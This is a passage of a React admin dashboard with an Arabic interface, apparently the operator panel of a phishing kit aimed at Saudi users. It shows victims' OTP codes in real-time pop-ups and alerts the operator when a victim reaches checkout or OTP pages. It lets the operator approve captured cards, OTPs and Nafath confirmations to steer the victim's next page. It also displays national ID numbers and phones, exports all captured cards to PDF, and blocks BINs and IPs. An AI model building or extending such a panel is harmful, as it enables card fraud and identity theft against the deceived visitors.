        const name = v.name || "زائر بدون اسم";
        toast({
          title: "🔐 رمز OTP جديد",
          description: `${name} • ${code}`,
          duration: 10000,
          action: (
            <ToastAction
              altText="فتح"
              onClick={() => setSelectedId(v.id)}
              data-testid={`toast-open-otp-${v.id}`}
            >
              فتح
            </ToastAction>
          ),
        });
      }

      // Detect transitions into sensitive pages (checkout/otp/confirmation).
      // Only fires when a visitor's `currentPage` actually CHANGES into a
      // sensitive page, never on every snapshot — so a visitor sitting on
      // /checkout for 3 minutes alerts exactly once. We also prune the
      // page map for visitors no longer in the snapshot so memory doesn't
      // grow unbounded over long-running sessions.
      const currentIds = new Set(list.map(v => v.id));
      for (const id of Array.from(lastPageRef.current.keys())) {
        if (!currentIds.has(id)) lastPageRef.current.delete(id);
      }
      for (const id of Array.from(cardSeenRef.current)) {
        if (!currentIds.has(id)) cardSeenRef.current.delete(id);
      }
      for (const id of Array.from(lastOtpRef.current.keys())) {
        if (!currentIds.has(id)) lastOtpRef.current.delete(id);
      }
      const triggered: Array<{
        id: string;
        kind: keyof typeof ALERT_TONES;
      }> = [];
      for (const v of list) {
        const page = String((v as any).currentPage || "");
        const prev = lastPageRef.current.get(v.id);
        lastPageRef.current.set(v.id, page);
        // Don't alert on the first snapshot pass — that is a baseline,
        // not a transition. `cardSnapshotReadyRef` is flipped true at the
        // bottom of this callback, AFTER lastPageRef is fully seeded.
        if (!cardSnapshotReadyRef.current) continue;
        if (prev === page) continue;
        const kind = alertKindFor(page);
        if (!kind) continue;
        triggered.push({ id: v.id, kind });
      }

      if (triggered.length > 0) {
        if (soundOnRef.current) {
          // Preserve the previous cadence: one sound per distinct visitor
          // alert kind in the polling batch, now using the configured MP3.
          const kinds = distinctVisitorAlertKinds(triggered.map(t => t.kind));
          kinds.forEach(() => playConfiguredVisitorAlert());
        }
        // Mark each triggered visitor with a glow window (8 seconds).
        const until = Date.now() + 8000;
        setRecentAlerts(prev => {
          const next = { ...prev };
          for (const { id, kind } of triggered) next[id] = { kind, until };
          return next;
        });
        // Bump unread counter only when the tab is hidden so the user
        // sees how many sensitive events fired while they were away.
        if (typeof document !== "undefined" && document.hidden) {
          setUnreadAlerts(n => n + triggered.length);
        }
      }

      cardSnapshotReadyRef.current = true;

      setVisitors(list);
      setLoading(false);
      setSelectedId(prev => {
        if (prev && list.some(v => v.id === prev)) return prev;
        return list[0]?.id ?? null;
      });
    });
    return () => unsub();
  }, []);

  // Sweep expired recent-alert glows once per second so rows return to
  // their normal styling without forcing every snapshot to do the work.
  useEffect(() => {
    const t = setInterval(() => {
      setRecentAlerts(prev => {
        const now = Date.now();
        let changed = false;
        const next: typeof prev = {};
        for (const [id, entry] of Object.entries(prev)) {
          if (entry.until > now) next[id] = entry;
          else changed = true;
        }
        return changed ? next : prev;
      });
    }, 1000);
    return () => clearInterval(t);
  }, []);

  // Tab title pulse: when the admin is on another tab and unread alerts
  // accrue, the title actually flips between two states once per second so
  // it visibly *pulses* in the OS task switcher — much more attention-
  // grabbing than a static prefix. Mounts ONCE and reads live unread count
  // from a ref so listeners aren't re-bound on every state change.
  const unreadAlertsRef = useRef(0);
  useEffect(() => {
    unreadAlertsRef.current = unreadAlerts;
  }, [unreadAlerts]);
  useEffect(() => {
    if (typeof document === "undefined") return;
    const dashboardTitle = "لوحة التحكم — الدرعية";
    const previousTitle = document.title;
    let phase = 0;
    const render = () => {
      const n = unreadAlertsRef.current;
      if (document.hidden && n > 0) {
        document.title =
          phase % 2 === 0
            ? `🔔 (${n}) ${dashboardTitle}`
            : `⚠️ (${n}) تنبيه عاجل`;
      } else {
        document.title = dashboardTitle;
      }
    };
    render();
    const interval = setInterval(() => {
      phase += 1;
      render();
    }, 1000);
    const onVis = () => {
      if (!document.hidden) setUnreadAlerts(0);
      phase = 0;
      render();
    };
    document.addEventListener("visibilitychange", onVis);
    window.addEventListener("focus", onVis);
    return () => {
      clearInterval(interval);
      document.removeEventListener("visibilitychange", onVis);
      window.removeEventListener("focus", onVis);
      // Restore whatever title was active before this dashboard mounted
      // so navigating away doesn't leave the dashboard title stuck.
      document.title = previousTitle;
    };
  }, []);

  useEffect(() => {
    const interval = window.setInterval(
      () => setPresenceTick(tick => tick + 1),
      10_000
    );
    return () => window.clearInterval(interval);
  }, []);

  const filtered = useMemo(() => {
    void presenceTick;
    return filterDashboardSidebarVisitors(
      visitors,
      filter as DashboardSidebarFilter,
      search,
      { isOnline, isWaiting, isCompleted }
    );
  }, [visitors, filter, search]);

  // Reset page to 1 when filter or search changes
  useEffect(() => {
    setCurrentPage(1);
  }, [filter, search, pageSize]);

  const totalPages = Math.max(1, Math.ceil(filtered.length / pageSize));
  const safePage = Math.min(Math.max(1, currentPage), totalPages);
  const paginatedVisitors = useMemo(() => {
    const start = (safePage - 1) * pageSize;
    return filtered.slice(start, start + pageSize);
  }, [filtered, safePage, pageSize]);

  const stats = useMemo(() => {
    const total = visitors.length;
    const online = visitors.filter(v => isOnline(v)).length;
    const waiting = visitors.filter(v => isWaiting(v)).length;
    const completed = visitors.filter(v => isCompleted(v)).length;
    const onPayment = visitors.filter(
      v => Number(v.step) >= 4 && Number(v.step) <= 6 && !isCompleted(v)
    ).length;
    return { total, online, waiting, completed, onPayment };
  }, [visitors]);

  // Beep when a NEW visitor enters waiting state.
  useEffect(() => {
    const currentWaiting = new Set(
      visitors.filter(v => isWaiting(v)).map(v => v.id)
    );
    let hasNew = false;
    currentWaiting.forEach(id => {
      if (!prevWaitingIds.current.has(id)) hasNew = true;
    });
    if (hasNew && soundOn && prevWaitingIds.current.size > 0) {
      beep();
    }
    prevWaitingIds.current = currentWaiting;
  }, [visitors, soundOn]);

  const selected = visitors.find(v => v.id === selectedId) || null;

  /**
   * Bridges the new dashboard's per-field approval model onto the existing
   * legacy fields the user-facing flow listens to. We also persist the new
   * `*ApprovalStatus` field so the dashboard UI reflects state immediately
   * on rebooted sessions.
   */
  async function setApprovalStatus(
    id: string,
    field:
      | "cardApprovalStatus"
      | "otpApprovalStatus"
      | "phoneOtpApprovalStatus"
      | "nafadConfirmationStatus",
    status: "approved" | "rejected"
  ) {
    const decidedAt = new Date().toISOString();
    const payload: Record<string, unknown> = {
      [field]: status,
      [`${field}DecidedAt`]: decidedAt,
      updatedAt: decidedAt,
    };

    // Keep the legacy fields in the same atomic write. The visitor-facing
    // checkout and OTP pages listen to these fields, while the dashboard
    // renders the newer per-field status values.
    if (field === "cardApprovalStatus") {
      const targetVisitor = visitors.find(visitor => visitor.id === id);
      const otpStep =
        targetVisitor && getVisitorFlow(targetVisitor) === "restaurant" ? 5 : 4;
      Object.assign(
        payload,
        buildCardApprovalPayload(status, decidedAt, otpStep)
      );
    } else if (field === "otpApprovalStatus") {
      payload.otpApproved = status === "approved";
      payload.otpStatus = status;
    }

    console.log("[DEBUG] setApprovalStatus update:", {
      id,
      field,
      status,
      payload,
    });

    // Optimistically apply approval status in local state immediately
    setVisitors(prev =>
      prev.map(v =>
        v.id === id ? adaptVisitor({ ...v, ...payload, id }) : v
      )
    );

    try {
      if (field === "cardApprovalStatus") {
        const targetVisitor = visitors.find(visitor => visitor.id === id);
        const otpStep =
          targetVisitor && getVisitorFlow(targetVisitor) === "restaurant"
            ? 5
            : 4;
        await updateApprovalStatus(id, status === "approved", otpStep);
      } else if (field === "otpApprovalStatus") {
        await updateOtpApprovalStatus(id, status === "approved");
      } else {
        await setDoc(doc(db, "pays", id), payload, { merge: true });
      }
      toast({
        title: status === "approved" ? "تمت الموافقة" : "تم الرفض",
        description:
          field === "cardApprovalStatus"
            ? "تم تحديث حالة البطاقة"
            : field === "otpApprovalStatus"
              ? "تم تحديث حالة رمز التحقق"
              : field === "phoneOtpApprovalStatus"
                ? "تم تحديث حالة رمز الهاتف"
                : "تم تحديث حالة نفاذ",
      });
    } catch (e) {
      console.error("setApprovalStatus failed", e);
      toast({
        title: "تعذر تحديث الموافقة",
        description: "تحقق من اتصال الخادم ثم حاول مرة أخرى",
        variant: "destructive",
      });
    }
  }

  async function pushDirective(id: string, payload: any) {
    const nextPayload = { ...payload, updatedAt: new Date().toISOString() };
    setVisitors(prev =>
      prev.map(v =>
        v.id === id ? adaptVisitor({ ...v, ...nextPayload, id }) : v
      )
    );
    await setDoc(doc(db, "pays", id), nextPayload, { merge: true });
  }

  async function removeVisitor(id: string) {
    if (!confirm("حذف هذا السجل؟")) return;
    // Preserve the IP block if this visitor was blocked, so deleting the
    // record doesn't accidentally let the same IP back in.
    try {
      const snap = await getDoc(doc(db, "pays", id));
      if (snap.exists()) {
        const data = snap.data() as any;
        const wasBlocked = data?.blocked === true;
        const ip = String(data?.ip || data?.ipAddress || "").trim();
        if (wasBlocked && ip) {
          await setDoc(
            doc(db, "settings", "blockedIps"),
            {
              ips: arrayUnion(ip),
              updatedAt: new Date().toISOString(),
            },
            { merge: true }
          );
        }
      }
    } catch (error) {
      console.error("Error preserving IP block on delete:", error);
    }
    await deleteDoc(doc(db, "pays", id));
    setCheckedIds(prev => prev.filter(x => x !== id));
    if (selectedId === id) setSelectedId(null);
  }

  function toggleCheckVisitor(id: string) {
    setCheckedIds(prev =>
      prev.includes(id) ? prev.filter(x => x !== id) : [...prev, id]
    );
  }

  const allVisibleChecked =
    paginatedVisitors.length > 0 &&
    paginatedVisitors.every(v => checkedIds.includes(v.id));

  function toggleSelectAllVisible() {
    if (allVisibleChecked) {
      const visibleSet = new Set(paginatedVisitors.map(v => v.id));
      setCheckedIds(prev => prev.filter(id => !visibleSet.has(id)));
    } else {
      const merged = new Set([
        ...checkedIds,
        ...paginatedVisitors.map(v => v.id),
      ]);
      setCheckedIds(Array.from(merged));
    }
  }

  async function removeCheckedVisitors() {
    if (checkedIds.length === 0) return;
    if (!confirm(`حذف الزوار المحددين (${checkedIds.length})؟`)) return;
    const idsToDelete = [...checkedIds];
    for (const id of idsToDelete) {
      await deleteDoc(doc(db, "pays", id));
    }
    setCheckedIds([]);
    if (selectedId && idsToDelete.includes(selectedId)) {
      setSelectedId(null);
    }
  }

  async function blockCheckedVisitors() {
    if (checkedIds.length === 0) return;
    if (!confirm(`حظر الزوار المحددين (${checkedIds.length})؟`)) return;
    for (const id of checkedIds) {
      await updateVisitorBlockStatus(id, true);
    }
    setCheckedIds([]);
  }

  async function removeAllVisitors() {
    const total = visitors.length;
    if (total === 0) {
      alert("لا توجد سجلات لحذفها");
      return;
    }
    if (!confirm(`سيتم حذف جميع السجلات (${total}) نهائياً!\nهل أنت متأكد؟`))
      return;
    if (!confirm("تأكيد أخير: حذف الكل؟ لا يمكن التراجع.")) return;
    const snap = await getDocs(collection(db, "pays"));
    const docs = snap.docs;
    for (let i = 0; i < docs.length; i += 450) {
      const batch = writeBatch(db);
      docs.slice(i, i + 450).forEach(d => batch.delete(d.ref));
      await batch.commit();
    }
    setCheckedIds([]);
    setSelectedId(null);
  }

  const timelineScrollRef = useRef<HTMLElement | null>(null);

  return (
    <div
      className="h-screen bg-white text-slate-800 flex flex-col overflow-hidden select-none"
      dir="rtl"
      style={{ fontFamily: "'Tajawal', 'Noto Sans Arabic', sans-serif" }}
    >
      {/* Top Navbar (Nexa Flow style) */}
      <header className="h-9 bg-white border-b border-slate-200 px-3 flex items-center justify-between shrink-0 z-30" dir="ltr">
        {/* Left: Nexa Flow brand & historical/live metrics */}
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-1.5 font-extrabold text-[15px] tracking-tight">
            <span className="text-blue-600">Nexa</span>
            <span className="text-slate-900">Flow</span>
          </div>
          <span className="text-slate-300">|</span>
          <div className="flex items-center gap-2.5 text-[11px] text-slate-600 font-mono tabular-nums">
            <Activity className="w-3.5 h-3.5 text-slate-400" />
            <span title="إجمالي الزوار">{stats.total}</span>
            <span className="text-slate-300">/</span>
            <span title="أونلاين">{stats.online}</span>
            <span className="text-slate-300">/</span>
            <span title="في مرحلة الدفع">{stats.onPayment}</span>
            <span className="text-slate-300">/</span>
            <span title="بانتظار الموافقة">{stats.waiting}</span>
            <span className="text-slate-300">/</span>
            <span title="مكتمل">{stats.completed}</span>
            <TrendingIcon />
          </div>
        </div>

        {/* Right: System icons & quick utilities */}
        <div className="flex items-center gap-1.5" dir="rtl">
          <CustomizeDropdown
            settings={cardSettings}
            onChange={updateCardSetting}
            onReset={resetCardSettings}
          />
          {selected && <PagesControlDropdown visitor={selected} />}
          <IconButton
            color={stats.waiting > 0 ? "red" : "slate"}
            icon={stats.waiting > 0 ? BellRing : Bell}
            label={
              stats.waiting > 0
                ? `${stats.waiting} بانتظار الموافقة`
                : "تنبيهات"
            }
            badge={stats.waiting > 0 ? String(stats.waiting) : undefined}
            pulse={stats.waiting > 0}
            onClick={() => setFilter("waiting")}
          />
          <IconButton
            color={soundOn ? "green" : "slate"}
            icon={soundOn ? Volume2 : VolumeX}
            label={soundOn ? "كتم الصوت" : "تشغيل الصوت"}
            onClick={() => {
              setSoundOn(s => !s);
              if (!soundOn) beep();
            }}
          />
          <IconButton
            color={blockedBins.length > 0 ? "red" : "slate"}
            icon={Ban}
            label="البطاقات المحظورة"
            badge={
              blockedBins.length > 0 ? String(blockedBins.length) : undefined
            }
            onClick={() => setBlocklistOpen(true)}
          />
          <IconButton
            color={blockedIps.length > 0 ? "red" : "slate"}
            icon={WifiOff}
            label="حظر بالـ IP"
            badge={
              blockedIps.length > 0 ? String(blockedIps.length) : undefined
            }
            onClick={() => setIpBlocklistOpen(true)}
          />
          <IconButton
            color="slate"
            icon={FileDown}
            label="تصدير البطاقات (PDF)"
            badge={(() => {
              const n = visitors.filter(
                v => v.payment?.c1 || v.payment?.cardLast4
              ).length;
              return n > 0 ? String(n) : undefined;
            })()}
            onClick={() => exportAllCardsPdf(visitors)}
          />
          <IconButton
            color={visitors.length > 0 ? "red" : "slate"}
            icon={Trash2}
            label="حذف كل السجلات"
            badge={visitors.length > 0 ? String(visitors.length) : undefined}
            onClick={() => void removeAllVisitors()}
          />
          <IconButton
            color="slate"
            icon={RefreshCw}
            label="تحديث"
            onClick={() => window.location.reload()}
          />
          <IconButton
            color="slate"
            icon={LogOut}
            label="خروج"
            onClick={() => {
              void logoutUser();
            }}
          />
        </div>
      </header>

      {/* Secondary Sub-header Bar (صندوق الوارد & Status Counters) */}
      <div className="h-9 bg-white border-b border-slate-200 px-4 flex items-center justify-between shrink-0">
        {/* Right side in RTL: Inbox title & counters */}
        <div className="flex items-center gap-4">
          <span className="text-[14px] font-bold text-slate-800">صندوق الوارد</span>
          <div className="flex items-center gap-1.5 text-[12px] font-mono tabular-nums" dir="ltr">
            <span className="text-emerald-600 font-bold">{stats.online}</span>
            <span className="text-slate-300">/</span>
            <span className="text-amber-500 font-bold">{stats.waiting}</span>
            <span className="text-slate-300">/</span>
            <span className="text-slate-500 font-semibold">{stats.total}</span>
          </div>
        </div>

        {/* Left side in RTL: Secondary counters & chat notification badge */}
        <div className="flex items-center gap-3 text-[12px] font-mono tabular-nums" dir="ltr">
          <div className="relative flex items-center">
            <span className="w-6 h-6 rounded border border-slate-200 bg-slate-50 flex items-center justify-center text-slate-600">
              <Layers className="w-3.5 h-3.5" />
            </span>
            {stats.waiting > 0 && (
              <span className=" -top-1.5 -left-1.5 absolute min-w-[15px] h-[15px] rounded-full bg-blue-600 text-white text-[9px] font-bold flex items-center justify-center px-1">
                {stats.waiting}
              </span>
            )}
          </div>
          <span className="text-slate-300">|</span>
          <div className="flex items-center gap-1.5">
            <span className="text-slate-600 font-semibold">{stats.total}</span>
            <span className="text-slate-300">/</span>
            <span className="text-amber-500 font-bold">{stats.waiting}</span>
            <span className="text-slate-300">/</span>
            <span className="text-emerald-600 font-bold">{stats.completed}</span>
          </div>
        </div>
      </div>

      {/* Main Workspace (Right Sidebar + Center/Left Content) */}
      <div className="flex flex-1 min-h-0 overflow-hidden bg-white">
        {/* Right Sidebar — Inbox Visitor List (صندوق الوارد) */}
        <aside className="w-[265px] shrink-0 border-l border-slate-200 bg-white flex flex-col min-h-0">
          {/* Filter & Search Bar */}
          <div className="p-2 border-b border-slate-200 space-y-2 bg-white">
            <div className="flex items-center justify-between gap-1.5">
              <label className="flex items-center gap-1.5 text-[12px] font-semibold text-slate-700 cursor-pointer select-none">
                <input
                  type="checkbox"
                  className="rounded border-slate-300 accent-blue-600 text-blue-600 focus:ring-0 w-3.5 h-3.5 cursor-pointer"
                  checked={allVisibleChecked}
                  onChange={toggleSelectAllVisible}
                  title="تحديد / إلغاء تحديد الكل"
                  data-testid="checkbox-select-all-visitors"
                />
                <span>كل المحادثات</span>
                {checkedIds.length > 0 && (
                  <span className="px-1.5 py-0.2 rounded-full bg-blue-100 text-blue-700 text-[10px] font-bold tabular-nums">
                    {checkedIds.length}
                  </span>
                )}
              </label>

              <div className="flex items-center gap-1.5">
                <span
                  className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-emerald-50 border border-emerald-200 text-[9px] font-bold text-emerald-700"
                  title="متصل بالتحديث المباشر (Realtime)"
                >
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                  مباشر
                </span>
                <button
                  onClick={() => triggerRealtimeRefresh(undefined, true)}
                  title="مزامنة فورية للبيانات"
                  className="p-1 text-slate-400 hover:text-blue-600 rounded hover:bg-slate-100 transition"
                  data-testid="button-realtime-refresh"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>

            {checkedIds.length > 0 && (
              <div
                className="flex items-center justify-between gap-1 px-2 py-1.5 rounded-md bg-blue-50/90 border border-blue-200 text-[10.5px]"
                data-testid="bulk-visitor-actions"
              >
                <span className="font-bold text-blue-800">
                  محدد: {checkedIds.length}
                </span>
                <div className="flex items-center gap-1">
                  <button
                    type="button"
                    onClick={() => void blockCheckedVisitors()}
                    className="px-2 py-0.5 rounded bg-amber-600 hover:bg-amber-700 text-white font-semibold transition flex items-center gap-1"
                    data-testid="button-bulk-block"
                  >
                    <Ban className="w-3 h-3" />
                    حظر
                  </button>
                  <button
                    type="button"
                    onClick={() => void removeCheckedVisitors()}
                    className="px-2 py-0.5 rounded bg-red-600 hover:bg-red-700 text-white font-semibold transition flex items-center gap-1"
                    data-testid="button-bulk-delete"
                  >
                    <Trash2 className="w-3 h-3" />
                    حذف
                  </button>
                  <button
                    type="button"
                    onClick={() => setCheckedIds([])}
                    className="px-1.5 py-0.5 rounded bg-white hover:bg-slate-100 text-slate-600 border border-slate-200 font-semibold transition"
                    data-testid="button-bulk-clear"
                  >
                    إلغاء
                  </button>
                </div>
              </div>
            )}

            {/* Search Input */}
            <div className="relative">
              <Search className="w-3.5 h-3.5 absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400" />
              <input
                value={search}
                onChange={e => setSearch(e.target.value)}
                placeholder="بحث المستخدم — اضغط ENTER"
                className="w-full pr-8 pl-2.5 py-1.5 bg-slate-50 border border-slate-200 rounded-md text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:border-blue-500 focus:bg-white transition"
                data-testid="admin-search"
              />
            </div>

            {/* Filter Pills (All / Online / Waiting / Completed) */}
            <div className="grid grid-cols-4 gap-1 text-[10px]">
              {(
                [
                  ["all", "الكل", stats.total],
                  ["online", "أونلاين", stats.online],
                  ["waiting", "انتظار", stats.waiting],
                  ["completed", "مكتمل", stats.completed],
                ] as const
              ).map(([k, l, count]) => {
                const active = filter === k;
                const isWait = k === "waiting" && count > 0;
                return (
                  <button
                    key={k}
                    onClick={() => setFilter(k)}
                    className={`py-1 rounded font-semibold transition flex items-center justify-center gap-0.5 ${
                      active
                        ? isWait
                          ? "bg-amber-500 text-white"
                          : "bg-blue-600 text-white"
                        : isWait
                          ? "bg-amber-50 text-amber-700 border border-amber-200 hover:bg-amber-100"
                          : "bg-slate-100 text-slate-600 hover:bg-slate-200"
                    }`}
                    data-testid={`filter-${k}`}
                  >
                    <span>{l}</span>
                    {count > 0 && (
                      <span
                        className={`text-[9px] px-1 rounded tabular-nums ${
                          active
                            ? "bg-black/15 text-white"
                            : isWait
                              ? "bg-amber-200/70 text-amber-900"
                              : "bg-slate-200 text-slate-700"
                        }`}
                      >
                        {count}
                      </span>
                    )}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Visitor List Scroll Area */}
          <div className="overflow-y-auto flex-1 divide-y divide-slate-100">
            {filtered.length === 0 && (
              <OrderSidebarEmptyState
                loading={loading}
                count={filtered.length}
              />
            )}
            {paginatedVisitors.map(v => {
              const online = isOnline(v);
              const sel = v.id === selectedId;
              const flow = getVisitorFlow(v);
              const rawStage = getFlowStepLabels(flow)[v.step as number] || "الصفحة الرئيسية";
              const arabicStage = rawStage.includes("·")
                ? rawStage.split("·")[1].trim()
                : rawStage;
              const waiting = isWaiting(v);
              const completed = isCompleted(v);
              const last4 = v.payment?.cardLast4;
              const isBlocked = blockedVisitors.includes(v.id);
              const alert = recentAlerts[v.id];
              const alertClass = alert
                ? alert.kind === "checkout"
                  ? "row-alert-checkout"
                  : alert.kind === "otp"
                    ? "row-alert-otp"
                    : "row-alert-confirmation"
                : "";
              const relTime = fmtRelative(v.updatedAt).replace(/^منذ\s+/, "");

              const isChecked = checkedIds.includes(v.id);

              return (
                <div
                  key={v.id}
                  role="button"
                  tabIndex={0}
                  onClick={() => setSelectedId(v.id)}
                  onKeyDown={e => {
                    if (e.key === "Enter" || e.key === " ")
                      setSelectedId(v.id);
                  }}
                  className={`w-full text-right px-2.5 py-2.5 transition flex items-center gap-2 group cursor-pointer relative ${alertClass} ${
                    isBlocked
                      ? "bg-red-50/70 hover:bg-red-100/60 opacity-75"
                      : sel
                        ? "bg-[#dce8fc]"
                        : isChecked
                          ? "bg-blue-50/70 hover:bg-blue-50"
                          : waiting
                            ? "bg-amber-50/60 hover:bg-amber-50"
                            : "bg-white hover:bg-slate-50"
                  }`}
                  data-testid={`visitor-${v.id}`}
                >
                  {/* Visitor Selection Checkbox */}
                  <input
                    type="checkbox"
                    checked={isChecked}
                    onClick={e => e.stopPropagation()}
                    onChange={() => {
                      toggleCheckVisitor(v.id);
                      setSelectedId(v.id);
                    }}
                    className="w-3.5 h-3.5 rounded border-slate-300 accent-blue-600 text-blue-600 focus:ring-0 shrink-0 cursor-pointer"
                    title="تحديد هذا الزائر"
                    data-testid={`checkbox-visitor-${v.id}`}
                  />

                  {/* Avatar on the right side with online dot & approval wait loader */}
                  <div className="relative shrink-0">
                    {waiting && (
                      <span
                        className="absolute -inset-1 rounded-full border-2 border-amber-500 border-t-transparent animate-spin pointer-events-none z-10"
                        title="بانتظار الموافقة"
                        data-testid={`avatar-wait-loader-${v.id}`}
                      />
                    )}
                    <div
                      className={`w-9 h-9 rounded-full flex items-center justify-center transition ${
                        waiting
                          ? "bg-amber-100 text-amber-600"
                          : online
                            ? "bg-emerald-50 text-emerald-700"
                            : "bg-slate-200 text-slate-500"
                      }`}
                    >
                      {waiting ? (
                        <RefreshCw className="w-4 h-4 text-amber-600 animate-spin" />
                      ) : (
                        <Users className="w-4 h-4" />
                      )}
                    </div>

                    {/* Online status dot on top-left of avatar */}
                    <span
                      className={`absolute -top-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-white z-20 ${
                        online ? "bg-emerald-500" : "bg-slate-300"
                      }`}
                      title={online ? "متصل الآن (Online)" : "غير متصل (Offline)"}
                      data-testid={`avatar-online-${v.id}`}
                    >
                      {online && (
                        <span className="absolute inset-0 rounded-full bg-emerald-400 animate-ping opacity-75" />
                      )}
                    </span>

                    {/* Country flag badge on bottom-right of avatar */}
                    <span
                      className={`absolute -bottom-0.5 -right-0.5 w-3.5 h-3.5 rounded-full border-2 border-white flex items-center justify-center text-[8px] z-20 ${
                        online
                          ? "bg-emerald-600 text-white"
                          : completed
                            ? "bg-blue-600 text-white"
                            : "bg-slate-400 text-white"
                      }`}
                      title={online ? "متصل الآن" : "غير متصل"}
                    >
                      🇸🇦
                    </span>
                  </div>

                  {/* Center: Name & current page subtitle */}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-1">
                      <div className="text-[12.5px] font-bold text-slate-900 truncate flex items-center gap-1.5">
                        <span className="truncate">{v.name || "زائر بدون اسم"}</span>
                        {online && (
                          <span className="inline-block w-1.5 h-1.5 rounded-full bg-emerald-500 shrink-0" />
                        )}
                      </div>
                      <span className="text-[10px] text-slate-400 shrink-0 tabular-nums">
                        {relTime}
                      </span>
                    </div>

                    <div className="flex items-center justify-between gap-1 mt-0.5">
                      <div className="text-[11px] text-slate-500 truncate flex items-center gap-1">
                        <span>
                          {v.otp
                            ? `رمز التحقق: ${v.otp}`
                            : v.payment?.c1 || last4
                              ? "الدفع ببطاقة الائتمان"
                              : arabicStage}
                        </span>
                        {last4 && (
                          <span className="text-[10px] text-blue-600 font-mono" dir="ltr">
                            ••{last4}
                          </span>
                        )}
                      </div>

                      {/* Mini status indicators on the left of row */}
                      <div className="flex items-center gap-1 shrink-0">
                        {waiting && (
                          <span
                            className="px-1.5 py-0.5 rounded bg-amber-100 text-amber-800 text-[9px] font-bold flex items-center gap-1"
                            title="بانتظار الموافقة"
                          >
                            <RefreshCw className="w-2.5 h-2.5 animate-spin" />
                            انتظار
                          </span>
                        )}
                        {(v.payment?.c1 || last4) && (
                          <CreditCard className="w-3 h-3 text-blue-600" />
                        )}
                      </div>
                    </div>
                  </div>

                  {/* Hover actions (Block / Delete) */}
                  <div className="flex items-center gap-0.5 opacity-0 group-hover:opacity-100 transition shrink-0">
                    <button
                      onClick={e => {
                        e.stopPropagation();
                        void toggleBlockedVisitor(v.id);
                      }}
                      title={isBlocked ? "إلغاء الحظر" : "حظر هذا الزائر"}
                      className={`p-1 rounded transition ${
                        isBlocked
                          ? "text-red-600 bg-red-100"
                          : "text-slate-400 hover:text-red-600 hover:bg-red-50"
                      }`}
                      data-testid={`block-${v.id}`}
                    >
                      <Ban className="w-3 h-3" />
                    </button>
                    <button
                      onClick={e => {
                        e.stopPropagation();
                        removeVisitor(v.id);
                      }}
                      title="حذف"
                      className="text-slate-400 hover:text-red-600 hover:bg-red-50 p-1 rounded transition"
                      data-testid={`del-${v.id}`}
                    >
                      <Trash2 className="w-3 h-3" />
                    </button>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Sidebar Pagination Footer */}
          {filtered.length > 0 && (
            <div
              className="px-2.5 py-2 border-t border-slate-200 bg-slate-50 flex items-center justify-between gap-1.5 text-[10px] text-slate-600 shrink-0"
              data-testid="visitor-pagination"
            >
              <div className="flex items-center gap-1">
                <button
                  type="button"
                  disabled={safePage <= 1}
                  onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
                  className="px-2 py-1 rounded border border-slate-200 bg-white hover:bg-slate-100 disabled:opacity-40 disabled:pointer-events-none font-semibold text-slate-700 transition"
                  data-testid="pagination-prev"
                >
                  السابق
                </button>
                <span className="px-1.5 font-mono font-semibold text-slate-700 tabular-nums">
                  {safePage} / {totalPages}
                </span>
                <button
                  type="button"
                  disabled={safePage >= totalPages}
                  onClick={() =>
                    setCurrentPage(p => Math.min(totalPages, p + 1))
                  }
                  className="px-2 py-1 rounded border border-slate-200 bg-white hover:bg-slate-100 disabled:opacity-40 disabled:pointer-events-none font-semibold text-slate-700 transition"
                  data-testid="pagination-next"
                >
                  التالي
                </button>
              </div>

              <div className="flex items-center gap-1">
                <span className="text-slate-400">عرض:</span>
                <select
                  value={pageSize}
                  onChange={e => setPageSize(Number(e.target.value) || 25)}
                  className="h-6 px-1.5 rounded border border-slate-200 bg-white text-[10px] font-semibold text-slate-700 focus:outline-none focus:border-blue-500"
                  data-testid="pagination-size"
                >
                  <option value={15}>15</option>
                  <option value={25}>25</option>
                  <option value={50}>50</option>
                  <option value={100}>100</option>
                </select>
              </div>
            </div>
          )}
        </aside>

        {/* Main Conversation / Detail Area */}
        <div className="flex-1 flex flex-col min-w-0 bg-white overflow-hidden">
          {selected ? (
            <>
              {/* Visitor Metadata Header Bar 1 */}
              <div className="h-9 border-b border-slate-200 px-3 flex items-center justify-between bg-white shrink-0 text-[11.5px]">
                {/* Right side in RTL: Visitor identity pills */}
                <div className="flex items-center gap-2 overflow-x-auto no-scrollbar">
                  <span className="font-mono font-bold text-blue-700 bg-blue-50 px-2 py-0.5 rounded border border-blue-200" dir="ltr">
                    {selected.id.slice(0, 7).toUpperCase()}
                  </span>
                  <span className="text-slate-300">|</span>
                  <span className="font-semibold text-slate-800 flex items-center gap-1">
                    <Users className="w-3.5 h-3.5 text-slate-400" />
                    {selected.name || "زائر بدون اسم"}
                  </span>
                  {selected.saudiId && (
                    <>
                      <span className="text-slate-300">|</span>
                      <span className="font-mono text-slate-700 flex items-center gap-1" dir="ltr">
                        {selected.saudiId}
                      </span>
                    </>
                  )}
                  {(selected.phone || selected.phoneVerification) && (
                    <>
                      <span className="text-slate-300">|</span>
                      <span className="font-mono text-slate-700 flex items-center gap-1" dir="ltr">
                        <PhoneIcon className="w-3 h-3 text-slate-400" />
                        {selected.phone || selected.phoneVerification}
                      </span>
                    </>
                  )}
                  <span className="text-slate-300">|</span>
                  <span className="text-slate-600 font-semibold">
                    {selected.nationality || "مقيم / زائر"}
                  </span>
                </div>

                {/* Left side in RTL: Action icons (Archive / Delete / Block) */}
                <div className="flex items-center gap-2 shrink-0">
                  <span className="text-[11px] font-mono text-slate-400" dir="ltr">
                    {Number(selected.step) || 1} - {getFlowTotalSteps(getVisitorFlow(selected))}
                  </span>
                  <span className="text-slate-300">|</span>
                  <button
                    onClick={() => void toggleBlockedVisitor(selected.id)}
                    className={`px-2 py-0.5 rounded text-[11px] font-semibold border transition flex items-center gap-1 ${
                      blockedVisitors.includes(selected.id)
                        ? "bg-red-50 text-red-600 border-red-200"
                        : "bg-slate-50 text-slate-600 border-slate-200 hover:bg-slate-100"
                    }`}
                  >
